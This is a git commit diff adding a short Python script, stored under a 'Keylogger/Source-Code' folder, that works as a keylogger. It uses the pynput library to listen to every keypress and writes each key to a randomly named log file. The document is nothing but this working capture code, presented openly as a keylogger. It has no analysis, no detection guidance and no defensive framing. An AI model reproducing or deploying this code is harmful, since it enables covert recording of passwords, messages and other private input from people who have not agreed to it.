00d8a1cb41f6747347fa9a1c40c6561a8313bfc3
Emi-dummy <85519326+Emi-dummy@users.noreply.github.com>
2021-08-23 20:56:13 -0600

    Add files via upload

---
+++ Keylogger/Source-Code/Keylognoprint.py
@@ -0,0 +1,25 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import random
+import string
+
+keys = []
+rng = [random.choice(string.ascii_letters[:94]) for x in range(8)]
+   
+def on_press(key):
+    keys.append(key)
+    write_file(keys)
+           
+def write_file(keys):
+    with open('log-'+''.join(rng)+'.txt', 'w') as f:
+        for key in keys:
+            if str(key) != None and 'Key' in str(key):
+                f.write('\n') 
+                f.write(str(key).replace("'", ""))
+                f.write('\n')
+            else: 
+                f.write(str(key).replace("'", ""))
+            
+   
+with Listener(on_press = on_press) as listener:
+    listener.join()
